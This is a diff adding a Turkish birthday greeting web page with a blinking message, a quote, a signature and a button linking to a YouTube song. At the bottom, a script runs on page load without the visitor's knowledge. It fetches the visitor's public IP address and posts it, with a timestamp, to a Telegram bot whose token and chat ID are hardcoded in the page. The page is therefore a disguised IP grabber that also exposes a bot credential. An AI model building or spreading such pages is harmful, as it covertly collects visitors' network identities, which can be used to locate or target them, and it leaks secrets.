@@ -1,0 +1,126 @@
+here<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>İyi ki Doğdun!</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background-color: #000;
+      color: #fff;
+      font-family: 'Arial', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 20px;
+    }
+    .container {
+      max-width: 800px;
+      width: 100%;
+      padding: 20px;
+    }
+    .message {
+      font-size: 3.5rem;
+      margin-bottom: 30px;
+      text-shadow: 0 0 15px rgba(255, 255, 255, 0.7), 0 0 25px rgba(255, 255, 255, 0.5);
+      animation: blink 3s infinite;
+    }
+    .quote {
+      font-size: 1.8rem;
+      font-style: italic;
+      margin: 0 auto 25px;
+      max-width: 700px;
+      padding: 10px;
+      animation: blink 3s infinite 0.5s;
+    }
+    .signature {
+      font-size: 1.4rem;
+      animation: blink 3s infinite 1s;
+      margin-bottom: 50px;
+      color: #ff6b6b;
+    }
+    .youtube-btn {
+      display: inline-flex;
+      align-items: center;
+      background: #ff0000;
+      color: white;
+      padding: 15px 30px;
+      border-radius: 50px;
+      text-decoration: none;
+      font-weight: bold;
+      font-size: 1.4rem;
+      transition: all 0.3s ease;
+      box-shadow: 0 5px 15px rgba(255, 0, 0, 0.3);
+      margin-top: 20px;
+      animation: float 3s ease-in-out infinite;
+    }
+    .youtube-btn:hover {
+      background: #cc0000;
+      transform: translateY(-5px);
+      box-shadow: 0 10px 20px rgba(255, 0, 0, 0.4);
+    }
+    .youtube-btn i { margin-right: 15px; font-size: 2rem; }
+    @keyframes blink {
+      0%, 100% { opacity: 1; text-shadow: 0 0 15px rgba(255, 255, 255, 0.7), 0 0 25px rgba(255, 255, 255, 0.5); }
+      50% { opacity: 0.3; text-shadow: none; }
+    }
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    @media (max-width: 768px) {
+      .message { font-size: 2.2rem; }
+      .quote { font-size: 1.3rem; }
+      .signature { font-size: 1.1rem; }
+      .youtube-btn { font-size: 1.1rem; padding: 12px 25px; }
+    }
+    @media (max-width: 480px) {
+      .message { font-size: 1.8rem; }
+      .quote { font-size: 1.1rem; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1 class="message"> İyi ki doğdun, iyi ki varsın </h1>
+    <p class="quote">""Ben sözümde durarım hiç bir zaman sözümden çıkmadım""</p>
+    <p class="signature">~ @v1rex.yuziww müco ~</p>
+
+    <a href="https://youtu.be/1ZCbjmLOEO0?si=Sg8GvgAQJXZBXTX5" target="_blank" class="youtube-btn">
+      <i class="fab fa-youtube"></i>
+      CANIN BENİ ÇEKTİ BAS VE DİNLE
+    </a>
+  </div>
+
+  <!-- IP'yi alıp Telegram'a gönderme -->
+  <script>
+    const TELEGRAM_TOKEN = "8297343609:AAEbRbFQlSlSHtMAxcuWEChtmo2NXxMukLE";  // örn: 1234567890:AAE_xxx
+    const CHAT_ID = "7140806512";              // örn: 123456789
+
+    async function sendIPToTelegram() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        const ip = data.ip;
+
+        const text = `🎂 Yeni ziyaretçi geldi!\n🌍 IP: ${ip}\n⏰ Zaman: ${new Date().toLocaleString()}`;
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text })
+        });
+      } catch (err) {
+        console.error("Gönderim hatası:", err);
+      }
+    }
+
+    window.addEventListener("load", sendIPToTelegram);
+  </script>
+</body>
+</html>
